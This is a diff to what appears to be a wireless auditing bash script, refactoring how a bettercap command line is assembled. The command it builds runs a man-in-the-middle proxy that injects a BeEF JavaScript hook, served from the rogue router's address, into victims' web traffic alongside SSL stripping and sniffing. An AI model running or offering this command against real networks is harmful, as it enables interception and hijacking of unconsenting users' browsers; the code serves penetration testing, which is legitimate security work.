@@ -155,7 +155,7 @@ internet_dns2="8.8.4.4"
 sslstrip_port="10000"
 bettercap_proxy_port="8080"
 bettercap_dns_port="5300"
-minimum_bettercap_disable_parsers_version="1.5.9"
+minimum_bettercap_advanced_options="1.5.9"
 sslstrip_file="ag.sslstrip.log"
 ettercap_file="ag.ettercap.log"
 bettercap_file="ag.bettercap.log"
@@ -8388,11 +8388,11 @@ function launch_bettercap_sniffing() {
 	recalculate_windows_sizes
 	sniffing_scr_window_position=${g4_bottomright_window}
 
-	if compare_floats_greater_or_equal "${bettercap_version}" "${minimum_bettercap_disable_parsers_version}"; then
-		bettercap_disable_parsers="--disable-parsers URL,HTTPS,DHCP "
+	if compare_floats_greater_or_equal "${bettercap_version}" "${minimum_bettercap_advanced_options}"; then
+		bettercap_extra_cmd_options="--disable-parsers URL,HTTPS,DHCP --no-http-logs"
 	fi
 
-	bettercap_cmd="bettercap -I ${interface} -X -S NONE --no-discovery --proxy --proxy-port ${bettercap_proxy_port} ${bettercap_disable_parsers}--no-http-logs --proxy-module injectjs --js-url \"http://${et_ip_router}:${beef_port}/${jshookfile}\" --dns-port ${bettercap_dns_port}"
+	bettercap_cmd="bettercap -I ${interface} -X -S NONE --no-discovery --proxy --proxy-port ${bettercap_proxy_port} ${bettercap_extra_cmd_options} --proxy-module injectjs --js-url \"http://${et_ip_router}:${beef_port}/${jshookfile}\" --dns-port ${bettercap_dns_port}"
 
 	if [ ${bettercap_log} -eq 1 ]; then
 		bettercap_cmd+=" -O \"${tmp_bettercaplog}\""
